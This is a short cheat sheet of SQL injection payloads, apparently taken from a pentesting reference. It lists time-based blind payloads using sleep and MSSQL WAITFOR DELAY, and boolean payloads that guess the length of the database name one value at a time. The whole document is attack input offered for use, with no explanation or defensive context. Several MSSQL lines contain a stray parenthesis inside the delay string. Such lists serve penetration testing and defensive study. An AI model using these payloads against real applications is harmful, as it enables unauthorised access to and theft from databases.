### Time-based

```bash
test' and sleep(5)-- - (Most databases)
test' and sleep(5)# (Most databases)
test;waitfor delay '0:0:5)'-- -  (MSSQL)
1');WAITFOR DELAY '0:0:5)'-- -  (MSSQL)
test';WAITFOR DELAY '0:0:5)'-- -  (MSSQL)
1;WAITFOR DELAY '0:0:5)'-- -  (MSSQL)
';WAITFOR DELAY '0:0:5'-- (MSSQL)
```

### Boolean

Determine character length of database name:

```bash
1' and length(database())=1#
1' and length(database())=2#
1' and length(database())=3#
```